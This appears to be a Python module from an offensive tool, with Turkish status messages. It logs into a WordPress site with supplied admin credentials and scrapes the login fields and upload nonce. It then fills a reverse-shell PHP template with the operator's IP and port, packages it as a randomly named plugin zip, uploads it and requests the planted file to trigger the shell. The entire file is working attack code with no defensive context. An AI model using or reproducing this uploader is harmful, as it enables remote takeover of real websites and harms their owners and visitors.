from requests import Session
from zipfile import ZipFile
from string import ascii_lowercase
from bs4 import BeautifulSoup
from core.colors import Colors
from random import choice
from os import remove

session = Session()

session.headers.update(
    {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
    }
)

directory = (''.join(choice(ascii_lowercase) for _ in range(7)))

def wordpress_shell_uploader(target, localhost, localport, username, password):
    print(f"{Colors.blue}[*] {Colors.white}Local Host: {localhost} / Local Port: {str(localport)}")
    print(f"{Colors.blue}[*] {Colors.white}Reverse shell dosyası yapılandırılıyor..")
    with open("files/shell.php", "r") as file:
        reverse_shell = file.read()

    reverse_shell = reverse_shell.replace("[LOCAL_IP_ADDRESS]", localhost)
    reverse_shell = reverse_shell.replace("[LOCAL_PORT]", str(localport))

    with open("shell.php", "w") as file:
        file.write(reverse_shell)

    with ZipFile("shell.zip", "w") as file:
        file.write("shell.php")

    remove("shell.php")

    response = session.get(target)

    source = BeautifulSoup(response.content, "html.parser")
    redirect_to = source.find("input", attrs={"name":"redirect_to"}).get("value")
    wp_submit = source.find("input", attrs={"name":"wp-submit"}).get("value")

    data = {
        "log": username,
        "pwd": password,
        "wp-submit": wp_submit,
        "redirect_to": redirect_to,
        "testcookie": "1"
    }
    
    response = session.post(target, data=data)

    if '<p class="admin-email__details">' in response.text or "id='wp-admin-bar-logout'" in response.text or 'id="menu-dashboard">' in response.text:
        print(f"{Colors.green}[+]{Colors.white} Siteye başarılı bir şekilde giriş yapıldı.")
    else:
        print(f"{Colors.red}[-] Siteye giriş yapılamadı.")
        return
    
    url = target.replace(target.split("/")[-1], "wp-admin/")
    check_plugins_dir = session.get(url + "plugin-install.php?tab=upload")

    if check_plugins_dir.status_code != 200:
        print(f"{Colors.red}[-]{Colors.white} Plugin yükleme sayfası bulunamadı.")
        return
    
    source = BeautifulSoup(check_plugins_dir.content, "html.parser")
    wpnonce = source.find("input", attrs={"name":"_wpnonce"}).get("value")
    shell_address = url.replace("wp-admin/", f"wp-content/plugins/{directory}/shell.php")

    print(f"{Colors.green}[+]{Colors.white} wpnonce bulundu: {wpnonce}")

    files = {
        "pluginzip": (directory + ".zip", open("shell.zip", "rb")),
        'install-plugin-submit': (None,'Install Now'),
        '_wpnonce': (None, wpnonce),
        '_wp_http_referer': (None, url + 'plugin-install.php?tab=upload'),
        'install-plugin-submit': (None,'Install Now')
    }

    remove("shell.zip")

    response = session.post(url + "update.php?action=upload-plugin", files=files)

    if 'href="plugins.php?action=activate' in response.text:
        print(f"{Colors.green}[+]{Colors.white} Reverse shell başarıyla yüklendi: {shell_address}")
        print(f"{Colors.blue}[*]{Colors.white} Reverse shell çalıştırıldı.")

        try:
            session.get(shell_address)
        except:
            pass
    else:
        print(f"{Colors.red}[-]{Colors.white} Reverse shell yüklenemedi.")